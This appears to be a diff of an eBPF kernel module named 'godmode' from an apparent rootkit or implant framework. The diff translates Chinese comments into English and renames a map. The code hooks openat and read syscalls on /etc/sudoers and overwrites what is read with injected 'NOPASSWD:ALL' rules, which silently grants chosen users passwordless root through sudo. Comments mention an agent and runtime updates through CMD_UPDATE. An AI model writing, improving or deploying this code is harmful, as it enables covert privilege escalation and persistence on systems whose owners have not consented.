@@ -5,34 +5,34 @@
 
 char LICENSE[] SEC("license") = "GPL";
 
-/* .metadata — console 用于解析模块信息 */
+/* .metadata — parsed by console to display module info */
 char _metadata[] __attribute__((used, section(".metadata"))) =
     "{"
       "\"name\":\"godmode\","
-      "\"desc\":\"内核权限劫持：动态篡改 sudoers 读取流，赋予目标用户无密码 sudo 权限\","
+      "\"desc\":\"Kernel Privilege Hijacking: Dynamically tampers with the sudoers read stream to grant passwordless sudo privileges to the target user.\","
       "\"requires\":[\"is_root\",\"tracefs\",\"probe_write\"],"
       "\"options\":{"
-        "\"TARGET_PAYLOAD\":[\"\\nroot ALL=(ALL:ALL) NOPASSWD:ALL\\n\",\"注入到 sudoers 的规则（可含多行用户）\"]"
+        "\"target\":[\"\\nroot ALL=(ALL:ALL) NOPASSWD:ALL\\n\",\"The rule to inject into sudoers (can contain multiple lines/users)\"]"
       "},"
       "\"maps\":{"
-        "\"inject_payload\":{\"key_size\":4,\"value_size\":64,\"key_type\":\"u32\",\"value_type\":\"str\"}"
+        "\"target\":{\"key_size\":4,\"value_size\":64,\"key_type\":\"u32\",\"value_type\":\"str\"}"
       "}"
     "}";
 
 /*
- * 运行时可配置 payload
- * key=0 → 64字节 sudoers 规则字符串（可含多用户多行）
- * 示例: "\ntest ALL=(ALL:ALL) NOPASSWD:ALL\ntest2 ALL=(ALL:ALL) NOPASSWD:ALL\n"
- * 由 agent 在加载时写入，也可通过 CMD_UPDATE 运行时更新
+ * Runtime-configurable payload
+ * key=0 → 64-byte sudoers rule string (can contain multiple users/lines)
+ * Example: "\ntest ALL=(ALL:ALL) NOPASSWD:ALL\ntest2 ALL=(ALL:ALL) NOPASSWD:ALL\n"
+ * Written by the agent at load time, or updated at runtime via CMD_UPDATE
  */
 struct {
     __uint(type, BPF_MAP_TYPE_ARRAY);
     __uint(max_entries, 1);
     __type(key, u32);
     __type(value, char[64]);
-} inject_payload SEC(".maps");
+} target SEC(".maps");
 
-/* 跟踪打开了 /etc/sudoers 的进程 pid_tgid → fd */
+/* Track processes that opened /etc/sudoers: pid_tgid → fd */
 struct {
     __uint(type, BPF_MAP_TYPE_HASH);
     __uint(max_entries, 1024);
@@ -40,7 +40,7 @@ struct {
     __type(value, u32);
 } active_sudoers_fd SEC(".maps");
 
-/* 跟踪正在 read() sudoers fd 的用户缓冲区 */
+/* Track user buffers currently read()ing the sudoers fd */
 struct {
     __uint(type, BPF_MAP_TYPE_HASH);
     __uint(max_entries, 1024);
@@ -53,7 +53,7 @@ int handle_openat_enter(struct trace_event_raw_sys_enter *ctx) {
     const char *filename = (const char *)ctx->args[1];
     char fname[16];
     bpf_probe_read_user_str(&fname, sizeof(fname), filename);
-    /* 匹配 "/etc/sudoers"（字符级别避免字符串函数） */
+    /* Match "/etc/sudoers" (character-level check to avoid string function overhead) */
     if (fname[0]=='/' && fname[1]=='e' && fname[2]=='t' && fname[3]=='c' &&
         fname[4]=='/' && fname[5]=='s' && fname[6]=='u' && fname[7]=='d' &&
         fname[8]=='o' && fname[9]=='e' && fname[10]=='r' && fname[11]=='s') {
@@ -99,7 +99,7 @@ int handle_read_exit(struct trace_event_raw_sys_exit *ctx) {
 
     if (ctx->ret > 64) {
         u32 key = 0;
-        char *payload = bpf_map_lookup_elem(&inject_payload, &key);
+        char *payload = bpf_map_lookup_elem(&target, &key);
         if (payload)
             bpf_probe_write_user(*buf_ptr, payload, 64);
     }
